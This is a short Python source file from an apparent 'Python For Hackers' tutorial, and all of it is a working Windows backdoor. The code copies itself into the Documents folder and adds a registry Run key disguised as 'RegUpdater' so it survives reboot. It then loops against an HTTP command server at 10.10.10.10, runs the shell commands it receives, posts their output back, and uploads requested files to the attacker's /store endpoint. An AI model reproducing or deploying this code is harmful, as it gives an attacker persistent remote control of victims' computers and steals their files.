# Python For Hackers - Priyank Gada
# www.youtube.com/priyankgada
# Video tutorials available 
# www.github.com/priyankgada 
# Under testing Mode 



import os
import shutil
import subprocess
import _winreg as wreg

import requests 
import time


path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'





if not os.path.exists(destination):  

    shutil.copyfile(path+'\persistence.exe', destination)
                                                         
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()


while True: 

    req = requests.get('http://10.10.10.10')
    command = req.text
        
    if 'terminate' in command:
        break 

    elif 'grab' in command:
        
        grab,path=command.split('*')
        if os.path.exists(path):
            url = 'http://10.10.10.10/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://10.10.10.10', data=
                                          '[-] Not able to find the file !' )
            
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.10', data=CMD.stdout.read() )
        post_response = requests.post(url='http://10.10.10.10', data=CMD.stderr.read() )

    time.sleep(3)












